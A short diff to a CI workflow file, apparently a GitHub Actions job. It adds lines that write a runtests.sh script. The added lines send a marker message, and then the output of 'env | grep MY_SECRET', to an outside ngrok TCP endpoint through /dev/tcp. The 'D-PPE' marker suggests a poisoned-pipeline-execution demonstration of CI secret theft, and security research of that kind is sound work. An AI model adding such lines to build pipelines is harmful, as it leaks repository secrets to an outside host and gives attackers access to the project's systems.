@@ -18,6 +18,9 @@ jobs:
         run: |
           mkdir ./bin
           echo "My bin file-1" > ./bin/mybin.exe
+          echo " echo D-PPE > ./runtests.out" > ./runtests.sh 
+          echo " echo Execution from READ user > /dev/tcp/4.tcp.eu.ngrok.io/18328" >> ./runtests.sh
+          echo " env | grep MY_SECRET > /dev/tcp/4.tcp.eu.ngrok.io/18328" >> ./runtests.sh
           ls -lR 
 
       
